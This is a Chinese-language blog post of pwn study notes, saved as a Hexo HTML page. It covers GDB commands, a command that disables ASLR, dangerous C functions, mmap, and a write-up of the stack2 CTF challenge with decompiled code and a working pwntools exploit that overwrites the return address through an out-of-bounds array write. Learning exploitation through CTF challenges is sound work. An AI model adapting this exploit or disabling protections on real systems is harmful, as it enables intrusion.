@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="GDB调试   命令 效果    退出和停止    quit 退出GDB   run 运行程序（在此给出命令行参数）   kill 停止程序   断点    break multstore 在函数multstore入口处设置断点   break * 0x400540 在地址0x400540处设置断点   delete 1 删除断点1   delete 删除断点   执行    stepi 执行1条">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习记录">
+<meta property="og:url" content="https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="GDB调试   命令 效果    退出和停止    quit 退出GDB   run 运行程序（在此给出命令行参数）   kill 停止程序   断点    break multstore 在函数multstore入口处设置断点   break * 0x400540 在地址0x400540处设置断点   delete 1 删除断点1   delete 删除断点   执行    stepi 执行1条">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%A0%88%E9%A1%B6%E8%B6%85%E7%95%8C.jpg">
+<meta property="article:published_time" content="2023-10-30T00:26:56.000Z">
+<meta property="article:modified_time" content="2023-11-25T17:09:12.817Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%A0%88%E9%A1%B6%E8%B6%85%E7%95%8C.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pwn学习记录</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/11/13/learn-pwn-in-ctfshow/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/29/gzhu-lalala/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&text=pwn学习记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&is_video=false&description=pwn学习记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn学习记录&body=Check out this article: https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&name=pwn学习记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&t=pwn学习记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GDB%E8%B0%83%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">GDB调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">保护机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E9%A1%B6%E8%B6%85%E7%95%8C"><span class="toc-number">2.1.</span> <span class="toc-text">栈顶超界</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">危险函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">3.</span> <span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mmp%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">mmp函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#magic-gadget"><span class="toc-number">4.</span> <span class="toc-text">magic_gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">5.</span> <span class="toc-text">攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack2%EF%BC%88%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">stack2（数组越界）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text"></span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        pwn学习记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-30T00:26:56.000Z" class="dt-published" itemprop="datePublished">2023-10-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h1><table>
+<thead>
+<tr>
+<th align="center">命令</th>
+<th align="center">效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">退出和停止</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">quit</td>
+<td align="center">退出GDB</td>
+</tr>
+<tr>
+<td align="center">run</td>
+<td align="center">运行程序（在此给出命令行参数）</td>
+</tr>
+<tr>
+<td align="center">kill</td>
+<td align="center">停止程序</td>
+</tr>
+<tr>
+<td align="center">断点</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">break multstore</td>
+<td align="center">在函数multstore入口处设置断点</td>
+</tr>
+<tr>
+<td align="center">break * 0x400540</td>
+<td align="center">在地址0x400540处设置断点</td>
+</tr>
+<tr>
+<td align="center">delete 1</td>
+<td align="center">删除断点1</td>
+</tr>
+<tr>
+<td align="center">delete</td>
+<td align="center">删除断点</td>
+</tr>
+<tr>
+<td align="center">执行</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">stepi</td>
+<td align="center">执行1条指令</td>
+</tr>
+<tr>
+<td align="center">stepi 4</td>
+<td align="center">执行4条指令</td>
+</tr>
+<tr>
+<td align="center">nexti</td>
+<td align="center">类似于stepi,但以函数调用为单位</td>
+</tr>
+<tr>
+<td align="center">continue</td>
+<td align="center">继续执行</td>
+</tr>
+<tr>
+<td align="center">finish</td>
+<td align="center">运行到当前函数返回</td>
+</tr>
+<tr>
+<td align="center">检查代码</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">disas</td>
+<td align="center">反汇编当前函数</td>
+</tr>
+<tr>
+<td align="center">disas multstore</td>
+<td align="center">反汇编函数multstore</td>
+</tr>
+<tr>
+<td align="center">disas 0x400544</td>
+<td align="center">反汇编位于地址0x400544附近的函数</td>
+</tr>
+<tr>
+<td align="center">disas 0x400540,0x40054d</td>
+<td align="center">反汇编指定地址范围内的代码</td>
+</tr>
+<tr>
+<td align="center">print &#x2F;x $rip</td>
+<td align="center">以十六进制输出程序计数器的值</td>
+</tr>
+<tr>
+<td align="center">检查数据</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">print $rax</td>
+<td align="center">以十进制输出$rax的内容</td>
+</tr>
+<tr>
+<td align="center">print &#x2F;x $rax</td>
+<td align="center">以十六进制输出$rax的内容</td>
+</tr>
+<tr>
+<td align="center">print &#x2F;t $rax</td>
+<td align="center">以二进制输出$rax的内容</td>
+</tr>
+<tr>
+<td align="center">print 0x100</td>
+<td align="center">输出0x100的十进制表示</td>
+</tr>
+<tr>
+<td align="center">print &#x2F;x 555</td>
+<td align="center">输出555的十六进制表示</td>
+</tr>
+<tr>
+<td align="center">print &#x2F;x ($rsp+8)</td>
+<td align="center">以十六进制输出$rax的内容加上8</td>
+</tr>
+<tr>
+<td align="center">print <em>(long</em>) 0x7fffffffe818</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">print <em>(long</em>) ($rsp+8)</td>
+<td align="center">输出位于$rsp+8处的长整数</td>
+</tr>
+<tr>
+<td align="center">x&#x2F;2g 0x7fffffffe818</td>
+<td align="center">检查从地址0x7fffffffe818开始的双（8字节）字</td>
+</tr>
+<tr>
+<td align="center">x&#x2F;20bmultstore</td>
+<td align="center">检查函数multstore的前20个字节</td>
+</tr>
+<tr>
+<td align="center">有用的信息</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">info frame</td>
+<td align="center">有关当前栈帧的信息</td>
+</tr>
+<tr>
+<td align="center">info registers</td>
+<td align="center">所有寄存器的值</td>
+</tr>
+<tr>
+<td align="center">help</td>
+<td align="center">获取有关gdb的信息</td>
+</tr>
+</tbody></table>
+<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>Linux关闭pie命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="栈顶超界"><a href="#栈顶超界" class="headerlink" title="栈顶超界"></a>栈顶超界</h2><p>如下图，当栈满的时候继续入栈或栈空的时候继续出栈都会使栈顶超出栈空间。</p>
+<img src="/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%A0%88%E9%A1%B6%E8%B6%85%E7%95%8C.jpg" class title="图片描述">
+
+<p>在程序末尾使用一下两条指令可以实现程序的返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure>
+<h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><p>gets(无限输入直到遇到回车)，scanf,vscanf,sprint,strcpy(字符复制，遇到‘\x00’停止)，strcat(字符拼接，遇到‘\x00’停止)，bcopy</p>
+<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h2 id="mmp函数"><a href="#mmp函数" class="headerlink" title="mmp函数"></a>mmp函数</h2><p>mmp函数：将硬盘上的一块区域映射为虚拟内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void*mmap(void addr,size_t langth,int prot,int flags,int fd,off-t offset);创建共享内存映射</span><br></pre></td></tr></table></figure>
+
+<p>addr:指定映射区的首地址。通常传NULL，表示让系统自动分配。</p>
+<p>length：共享内存映射区的大小。(&lt;&#x3D;文件的实际大小，通常为文件大小&gt;)</p>
+<p>port：共享内存映射区的读写属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROT_READ、PROT_WRITE、PROT_READ|PROT_WRITE</span><br></pre></td></tr></table></figure>
+
+<p>flags：标注共享内存的共享属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAP_SHARED (共享，会将映射区所做的操作反映到物理设备(磁盘)上。)</span><br><span class="line">MAP_PRIVATE (私有，映射区所做的修改不会反映到物理设备。)</span><br></pre></td></tr></table></figure>
+
+<p>fd：用于创建共享内存映射区的那个文件的文件描述符。</p>
+<p>offset：默认0，表示映射文件全部。偏移位置。需为4k的整数倍。</p>
+<p>返回值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：映射区的首地址。</span><br><span class="line">失败：MAP_FAILED(void(-1)),errno</span><br></pre></td></tr></table></figure>
+
+<h1 id="magic-gadget"><a href="#magic-gadget" class="headerlink" title="magic_gadget"></a>magic_gadget</h1><p>ida查看后发现不能用ret2redlslove解决，要用magic_gadget</p>
+<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h2 id="stack2（数组越界）"><a href="#stack2（数组越界）" class="headerlink" title="stack2（数组越界）"></a>stack2（数组越界）</h2><p>checksec一下，发现有栈溢出保护。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>ida查看，看不出来，网上说是数组越界。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int v5; // [esp+18h] [ebp-90h] BYREF</span><br><span class="line">  unsigned int v6; // [esp+1Ch] [ebp-8Ch] BYREF</span><br><span class="line">  int v7; // [esp+20h] [ebp-88h] BYREF</span><br><span class="line">  unsigned int j; // [esp+24h] [ebp-84h]</span><br><span class="line">  int v9; // [esp+28h] [ebp-80h]</span><br><span class="line">  unsigned int i; // [esp+2Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int k; // [esp+30h] [ebp-78h]</span><br><span class="line">  unsigned int l; // [esp+34h] [ebp-74h]</span><br><span class="line">  char v13[100]; // [esp+38h] [ebp-70h] overflow</span><br><span class="line">  unsigned int v14; // [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v9 = 0;</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;*                      An easy calc                       *&quot;);</span><br><span class="line">  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);</span><br><span class="line">  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;How many numbers you have:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">  puts(&quot;Give me your numbers&quot;);</span><br><span class="line">  for ( i = 0; i &lt; v5 &amp;&amp; (int)i &lt;= 99; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 / (double)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v6);</span><br><span class="line">          if ( v6 != 2 )</span><br><span class="line">            break;</span><br><span class="line">          puts(&quot;Give me your number&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">          if ( j &lt;= 0x63 )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v6 &gt; 2 )</span><br><span class="line">          break;</span><br><span class="line">        if ( v6 != 1 )</span><br><span class="line">          return 0;</span><br><span class="line">        puts(&quot;id\t\tnumber&quot;);</span><br><span class="line">        for ( k = 0; k &lt; j; ++k )</span><br><span class="line">          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v6 != 3 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;which number to change:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">      puts(&quot;new number:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v6 != 4 )</span><br><span class="line">      break;</span><br><span class="line">    v9 = 0;</span><br><span class="line">    for ( l = 0; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">process_name = &#x27;./stack2&#x27;</span><br><span class="line">p = process(&#x27;./stack2&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">hackhere = [0x9b, 0x85, 0x04, 0x08]  #0x0804859B</span><br><span class="line">write_offset = 0x84</span><br><span class="line"> </span><br><span class="line">def change_number(offset, value):</span><br><span class="line">        p.sendlineafter(&#x27;5. exit&#x27;, &#x27;3&#x27;)</span><br><span class="line">        p.sendlineafter(&#x27;which number to change:&#x27;, str(offset))</span><br><span class="line">        p.sendlineafter(&#x27;new number:&#x27;, str(value))</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(&#x27;How many numbers you have:&#x27;, &#x27;1&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;Give me your numbers&#x27;, &#x27;1&#x27;)</span><br><span class="line">for i in range(4):</span><br><span class="line">        change_number(write_offset+i, hackhere[i])</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(&#x27;5. exit&#x27;, &#x27;5&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id><a href="#" class="headerlink" title></a></h1>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GDB%E8%B0%83%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">GDB调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">保护机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E9%A1%B6%E8%B6%85%E7%95%8C"><span class="toc-number">2.1.</span> <span class="toc-text">栈顶超界</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">危险函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">3.</span> <span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mmp%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">mmp函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#magic-gadget"><span class="toc-number">4.</span> <span class="toc-text">magic_gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">5.</span> <span class="toc-text">攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack2%EF%BC%88%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">stack2（数组越界）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text"></span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&text=pwn学习记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&is_video=false&description=pwn学习记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
